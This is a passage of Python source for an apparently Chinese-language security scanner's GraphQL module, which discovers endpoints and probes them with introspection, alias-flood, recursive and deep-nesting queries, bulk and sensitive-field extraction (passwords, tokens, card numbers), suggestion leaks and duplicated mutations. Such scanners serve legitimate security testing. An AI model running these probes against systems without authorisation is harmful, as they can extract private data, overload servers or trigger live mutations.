5. 批量字段提取（数据过量检测）
6. 敏感字段提取（基于内省结果）
7. 深度嵌套查询检测
"""


class GraphQLEngine(BaseEngine):
    name = "graphql"
    description = "GraphQL 攻击检测引擎"

    GRAPHQL_PATHS = [
        "/graphql", "/graphiql", "/playground", "/gql",
        "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/graphql/console", "/graphql/playground", "/api/graphql/console",
        "/query", "/api/query", "/graph", "/api/graph",
        "/graphql/explorer", "/explorer"
    ]

    INTROSPECTION_QUERIES = [
        'query { __schema { types { name } } }',
        'query { __schema { types { name fields { name type { name kind } } } } }',
        'query { __schema { mutationType { fields { name } } } }',
        'query { __schema { subscriptionType { fields { name } } } }',
        'query { __schema { queryType { fields { name type { name kind } } } } }',
        'query { __schema { types { name kind description fields { name type { name kind ofType { name kind } } } } } }',
    ]

    COMMON_FIELDS = [
        "id", "name", "email", "phone", "address", "age", "gender",
        "username", "firstName", "lastName", "title", "description",
        "content", "status", "role", "permission", "token",
        "refreshToken", "expiresAt", "isActive", "isAdmin",
        "createdAt", "updatedAt", "deletedAt", "version",
        "price", "quantity", "total", "subtotal", "tax",
        "currency", "locale", "timezone", "language",
        "profile", "avatar", "picture", "photo", "image",
        "url", "link", "slug", "path", "route",
        "type", "category", "tag", "label", "value",
        "count", "limit", "offset", "page", "size",
        "order", "sort", "filter", "search", "query",
    ]

    SENSITIVE_FIELD_KEYWORDS = [
        "password", "secret", "token", "key", "api_key",
        "credit", "card", "ssn", "social", "private",
        "internal", "admin", "root", "privilege",
        "permission", "access", "auth", "credential",
        "hash", "salt", "iv", "cipher", "encrypt",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if await self._is_graphql_endpoint(url, session):
            return {
                'url': url,
                'type': 'GraphQL 端点发现',
                'ai_verdict': '信息',
                'evidence': f'发现 GraphQL 端点: {url}',
                'diff_ratio': 0.0,
                'is_endpoint': True
            }
        return None

    async def _is_graphql_endpoint(self, url: str, session) -> bool:
        url_lower = url.lower()
        if any(path in url_lower for path in self.GRAPHQL_PATHS):
            return True

        try:
            resp = await async_post(
                url,
                json={"query": "query { __typename }"},
                session=session,
                timeout=5
            )
            if isinstance(resp, tuple):
                text = resp[1]
                status = resp[0]
            else:
                text = await resp.text()
                status = resp.status

            if status == 200 and ('__typename' in text or 'data' in text):
                return True
        except Exception:
            pass
        return False

    async def discover_endpoints(
        self,
        base_url: str,
        session
    ) -> List[str]:
        endpoints = []
        base = base_url.rstrip('/')

        for path in self.GRAPHQL_PATHS:
            test_url = base + path
            try:
                resp = await async_get(test_url, session=session, timeout=5)
                if isinstance(resp, tuple):
                    status = resp[0]
                    resp[1]
                else:
                    status = resp.status
                    await resp.text()

                if status in (200, 400, 405):
                    test_resp = await async_post(
                        test_url,
                        json={"query": "query { __typename }"},
                        session=session,
                        timeout=5
                    )
                    if isinstance(test_resp, tuple):
                        test_text = test_resp[1]
                        test_status = test_resp[0]
                    else:
                        test_text = await test_resp.text()
                        test_status = test_resp.status

                    if test_status in (200, 400) and ('__typename' in test_text or 'data' in test_text or 'graphql' in test_text.lower()):
                        endpoints.append(test_url)
                        logger.info(f"🎯 发现 GraphQL 端点: {test_url}")
            except Exception:
                pass
        return endpoints

    async def test_introspection(
        self,
        endpoint: str,
        session
    ) -> Dict:
        result = {
            "enabled": False,
            "schema": None,
            "type_count": 0,
            "field_count": 0,
            "query_fields": [],
            "mutation_fields": [],
            "subscription_fields": []
        }

        for query in self.INTROSPECTION_QUERIES:
            try:
                resp = await async_post(
                    endpoint,
                    json={"query": query},
                    session=session,
                    timeout=10
                )

                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                if status == 200:
                    try:
                        data = json.loads(text)
                        if '__schema' in data.get('data', {}):
                            result["enabled"] = True
                            result["schema"] = data['data']['__schema']
                            types = data['data']['__schema'].get('types', [])
                            result["type_count"] = len(types)

                            query_type = data['data']['__schema'].get('queryType', {})
                            if query_type:
                                for t in types:
                                    if t.get('name') == query_type.get('name'):
                                        result["query_fields"] = [
                                            f.get('name') for f in t.get('fields', [])
                                            if f.get('name') and not f.get('name').startswith('__')
                                        ]
                                        result["field_count"] = len(result["query_fields"])
                                        break

                            mutation_type = data['data']['__schema'].get('mutationType', {})
                            if mutation_type:
                                for t in types:
                                    if t.get('name') == mutation_type.get('name'):
                                        result["mutation_fields"] = [
                                            f.get('name') for f in t.get('fields', [])
                                            if f.get('name') and not f.get('name').startswith('__')
                                        ]
                                        break

                            subscription_type = data['data']['__schema'].get('subscriptionType', {})
                            if subscription_type:
                                for t in types:
                                    if t.get('name') == subscription_type.get('name'):
                                        result["subscription_fields"] = [
                                            f.get('name') for f in t.get('fields', [])
                                            if f.get('name') and not f.get('name').startswith('__')
                                        ]
                                        break

                            logger.info(f"   📊 内省开启: {result['type_count']} 个类型, {result['field_count']} 个查询字段")
                            break
                    except BaseException:
                        pass
            except Exception:
                pass
        return result

    async def test_alias_collision(
        self,
        endpoint: str,
        session,
        alias_count: int = 100
    ) -> Optional[Dict]:
        aliases = " ".join([f"a{i}: __typename" for i in range(alias_count)])
        query = f"query {{ {aliases} }}"

        try:
            start_time = asyncio.get_event_loop().time()
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=30
            )
            elapsed = asyncio.get_event_loop().time() - start_time

            if isinstance(resp, tuple):
                status = resp[0]
                text = resp[1]
            else:
                status = resp.status
                text = await resp.text()

            if status == 200:
                data = json.loads(text)
                if 'errors' in data:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 别名碰撞攻击',
                        'severity': 'Medium',
                        'evidence': f'{alias_count} 个别名查询返回错误: {data.get("errors", [{}])[0].get("message", "")[:100]}',
                        'elapsed': elapsed,
                        'recommendation': '限制别名数量或使用查询复杂度分析'
                    }
                elif elapsed > 5:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 别名碰撞攻击（性能问题）',
                        'severity': 'Low',
                        'evidence': f'{alias_count} 个别名查询耗时 {elapsed:.1f}s',
                        'elapsed': elapsed,
                        'recommendation': '启用查询复杂度限制'
                    }
        except asyncio.TimeoutError:
            return {
                'url': endpoint,
                'type': 'GraphQL 别名碰撞攻击（超时）',
                'severity': 'High',
                'evidence': f'{alias_count} 个别名查询导致超时，存在 DoS 风险',
                'recommendation': '限制别名数量，启用查询超时'
            }
        except Exception:
            pass
        return None

    async def test_recursive_query(
        self,
        endpoint: str,
        session,
        depth: int = 10
    ) -> Optional[Dict]:
        recursive = "friends { name "
        for i in range(2, depth + 1):
            recursive += "friends { name "
        recursive += "} " * depth

        query = f"query {{ user(id: 1) {{ {recursive} }} }}"

        try:
            start_time = asyncio.get_event_loop().time()
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=30
            )
            elapsed = asyncio.get_event_loop().time() - start_time

            if isinstance(resp, tuple):
                status = resp[0]
                text = resp[1]
            else:
                status = resp.status
                text = await resp.text()

            if status == 200:
                data = json.loads(text)
                if 'errors' in data:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 递归查询攻击',
                        'severity': 'Medium',
                        'evidence': f'{depth} 层递归查询返回错误: {data.get("errors", [{}])[0].get("message", "")[:100]}',
                        'elapsed': elapsed,
                        'recommendation': '限制查询深度'
                    }
                elif 'user' in data.get('data', {}):
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 递归查询攻击（无深度限制）',
                        'severity': 'High',
                        'evidence': f'{depth} 层递归查询成功返回，耗时 {elapsed:.2f}s，存在 DoS 风险',
                        'elapsed': elapsed,
                        'recommendation': '设置最大查询深度限制'
                    }
                elif elapsed > 8:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 递归查询攻击（性能问题）',
                        'severity': 'Medium',
                        'evidence': f'{depth} 层递归查询耗时 {elapsed:.1f}s',
                        'elapsed': elapsed,
                        'recommendation': '限制查询深度'
                    }
        except asyncio.TimeoutError:
            return {
                'url': endpoint,
                'type': 'GraphQL 递归查询攻击（超时）',
                'severity': 'High',
                'evidence': f'{depth} 层递归查询导致超时，存在 DoS 风险',
                'recommendation': '设置最大查询深度限制'
            }
        except Exception:
            pass
        return None

    async def test_batch_field_extraction(
        self,
        endpoint: str,
        session,
        introspection_result: Dict = None
    ) -> Optional[Dict]:
        if introspection_result and introspection_result.get('enabled'):
            query_fields = introspection_result.get('query_fields', [])
            if query_fields:
                fields = [f for f in query_fields if f and not f.startswith('__')][:30]
                if len(fields) >= 5:
                    fields_str = " ".join(fields[:25])
                    query = f"query {{ {fields_str} }}"
                    logger.info(f"   📦 批量提取 {len(fields[:25])} 个字段: {fields[:5]}...")
                    return await self._send_batch_query(endpoint, query, session, fields)

        common_fields = self.COMMON_FIELDS[:25]
        fields_str = " ".join(common_fields)
        query = f"query {{ user(id: 1) {{ {fields_str} }} }}"
        return await self._send_batch_query(endpoint, query, session, common_fields)

    async def _send_batch_query(
        self,
        endpoint: str,
        query: str,
        session,
        fields: List[str]
    ) -> Optional[Dict]:
        try:
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=15
            )

            if isinstance(resp, tuple):
                status = resp[0]
                text = resp[1]
            else:
                status = resp.status
                text = await resp.text()

            if status == 200:
                data = json.loads(text)
                if 'data' in data:
                    returned_count = len(data['data'])
                    if returned_count > 10:
                        return {
                            'url': endpoint,
                            'type': 'GraphQL 批量字段提取（数据过量）',
                            'severity': 'Medium',
                            'evidence': f'一次查询返回 {returned_count} 个字段，可能存在数据过度提取',
                            'fields': fields[:10],
                            'recommendation': '限制单次查询返回字段数量，使用查询复杂度分析'
                        }
        except Exception:
            pass
        return None

    async def test_sensitive_field_extraction(
        self,
        endpoint: str,
        session,
        introspection_result: Dict = None
    ) -> Optional[Dict]:
        if not introspection_result or not introspection_result.get('enabled'):
            return None

        sensitive_fields = []
        types = introspection_result.get('schema', {}).get('types', [])

        for t in types:
            type_name = t.get('name', '').lower()
            if any(kw in type_name for kw in ['user', 'account', 'profile', 'admin', 'setting', 'config']):
                for field in t.get('fields', []):
                    field_name = field.get('name', '').lower()
                    if any(kw in field_name for kw in self.SENSITIVE_FIELD_KEYWORDS):
                        sensitive_fields.append(field.get('name'))

        if sensitive_fields:
            fields_str = " ".join(sensitive_fields[:15])
            query = f"query {{ user(id: 1) {{ {fields_str} }} }}"

            try:
                resp = await async_post(
                    endpoint,
                    json={"query": query},
                    session=session,
                    timeout=10
                )

                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                if status == 200:
                    data = json.loads(text)
                    if 'data' in data:
                        user_data = data['data'].get('user', {})
                        returned_sensitive = [
                            k for k in user_data.keys()
                            if any(kw in k.lower() for kw in self.SENSITIVE_FIELD_KEYWORDS)
                        ]
                        if returned_sensitive:
                            return {
                                'url': endpoint,
                                'type': 'GraphQL 敏感字段泄露',
                                'severity': 'High',
                                'evidence': f'成功提取敏感字段: {", ".join(returned_sensitive[:5])}',
                                'fields': returned_sensitive,
                                'recommendation': '禁止查询敏感字段，使用权限控制'
                            }
            except Exception:
                pass
        return None

    async def test_deep_nesting(
        self,
        endpoint: str,
        session,
        depth: int = 8
    ) -> Optional[Dict]:
        nesting = "user { "
        for i in range(depth):
            nesting += "profile { "
        nesting += "name "
        nesting += "} " * depth

        query = f"query {{ {nesting} }}"

        try:
            start_time = asyncio.get_event_loop().time()
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=30
            )
            elapsed = asyncio.get_event_loop().time() - start_time

            if isinstance(resp, tuple):
                resp[0]
            else:
                pass

            if elapsed > 10:
                return {
                    'url': endpoint,
                    'type': 'GraphQL 深度嵌套攻击（性能问题）',
                    'severity': 'Medium',
                    'evidence': f'{depth} 层嵌套查询耗时 {elapsed:.1f}s',
                    'elapsed': elapsed,
                    'recommendation': '设置最大查询深度限制'
                }
        except asyncio.TimeoutError:
            return {
                'url': endpoint,
                'type': 'GraphQL 深度嵌套攻击（超时）',
                'severity': 'High',
                'evidence': f'{depth} 层嵌套查询导致超时，存在 DoS 风险',
                'recommendation': '设置最大查询深度限制'
            }
        except Exception:
            pass
        return None

    async def test_suggestions_leak(
        self,
        endpoint: str,
        session,
    ) -> Optional[Dict]:
        """A5-2：字段建议泄漏（suggestions）——未知字段报错若回显 suggestions / Did you mean，
        可辅助攻击者枚举 Schema，属信息泄露。"""
        query = "query { nonexistentfieldzzz }"
        try:
            resp = await async_post(endpoint, json={"query": query}, session=session, timeout=10)
            if isinstance(resp, tuple):
                status, text = resp[0], resp[1]
            else:
                status, text = resp.status, await resp.text()
            if status != 200 or not isinstance(text, str):
                return None
            data = json.loads(text)
            for err in (data.get("errors") or []):
                suggestions = (err.get("extensions") or {}).get("suggestions")
                message = str(err.get("message", ""))
                if suggestions:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 字段建议泄漏(suggestions)',
                        'severity': 'Low',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f'未知字段报错回显 suggestions: {suggestions[:5]} —— 可辅助枚举 Schema',
                        'recommendation': '关闭 GraphQL 错误中的字段建议（禁止回显 suggestions/Did you mean）',
                    }
                if 'did you mean' in message.lower():
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 字段建议泄漏(suggestions)',
                        'severity': 'Low',
                        'ai_verdict': '中',
                        'confidence': 'low',
                        'evidence': f'未知字段报错包含字段建议提示: {message[:120]}',
                        'recommendation': '关闭 GraphQL 错误中的字段建议（禁止回显 suggestions/Did you mean）',
                    }
        except Exception:
            pass
        return None

    async def test_mutation_idor(
        self,
        endpoint: str,
        session,
        introspection_result: Dict = None,
    ) -> Optional[Dict]:
        """A5-4：alias-based mutation 滥用面检测。仅当内省暴露 update/create/delete 类 mutation 字段时，
        尝试单次请求内用两个 alias 复用同一 mutation（不同标量参数，非破坏性——无效参数在执行前被校验拒绝），
        若两者均被返回且无错误，说明存在单请求批量变更/限流绕过面，需人工确认授权。"""
        if not introspection_result or not introspection_result.get('enabled'):
            return None
        mutation_fields = introspection_result.get('mutation_fields') or []
        target = next((f for f in mutation_fields
                       if any(k in f.lower() for k in ('update', 'create', 'delete', 'add', 'remove', 'set'))),
                      None)
        if not target:
            return None
        query = (
            "mutation {"
            f" a: {target}(dummy: 1) {{ __typename }}"
            f" b: {target}(dummy: 2) {{ __typename }}"
            " }"
        )
        try:
            resp = await async_post(endpoint, json={"query": query}, session=session, timeout=10)
            if isinstance(resp, tuple):
                status, text = resp[0], resp[1]
            else:
                status, text = resp.status, await resp.text()
            if status != 200 or not isinstance(text, str):
                return None
            data = json.loads(text)
            if 'errors' in data:
                return None
            mut = data.get('data', {}).get(target)
            if isinstance(mut, dict) and 'a' in mut and 'b' in mut:
                return {
                    'url': endpoint,
                    'type': 'GraphQL alias 批量变更(越权/限流绕过面)',
                    'severity': 'Low',
                    'ai_verdict': '中',
                    'confidence': 'low',
                    'evidence': f'单次请求内两个 alias 复用 mutation `{target}` 均被执行，存在批量操作/限流绕过面，需人工确认授权',
                    'recommendation': '对 mutation 做单请求操作数限制与逐操作授权校验',
                }
        except Exception:
            pass
        return None

    async def scan(
        self,
        target: str,
        session,
        **kwargs
    ) -> List[Dict]:
        findings = []

        endpoints = await self.discover_endpoints(target, session)

        if not endpoints:
            logger.info("ℹ️ 未发现 GraphQL 端点，跳过检测")
            return findings

        logger.info(f"🔍 发现 {len(endpoints)} 个 GraphQL 端点")

        for endpoint in endpoints:
            logger.info(f"📊 测试 GraphQL 端点: {endpoint}")

            introspection = await self.test_introspection(endpoint, session)

            if introspection.get('enabled'):
                findings.append({
                    'url': endpoint,
                    'type': 'GraphQL 内省开启',
                    'severity': 'Medium',
                    'evidence': f'内省查询返回 {introspection["type_count"]} 个类型, {introspection["field_count"]} 个查询字段',
                    'recommendation': '在生产环境禁用内省',
                    'introspection': introspection
                })

            result = await self.test_alias_collision(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_recursive_query(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_batch_field_extraction(endpoint, session, introspection)
            if result:
                findings.append(result)

            if introspection.get('enabled'):
                result = await self.test_sensitive_field_extraction(endpoint, session, introspection)
                if result:
                    findings.append(result)

            result = await self.test_deep_nesting(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_suggestions_leak(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_mutation_idor(endpoint, session, introspection)
            if result:
                findings.append(result)

        logger.info(f"✅ GraphQL 扫描完成，发现 {len(findings)} 个问题")
        return findings
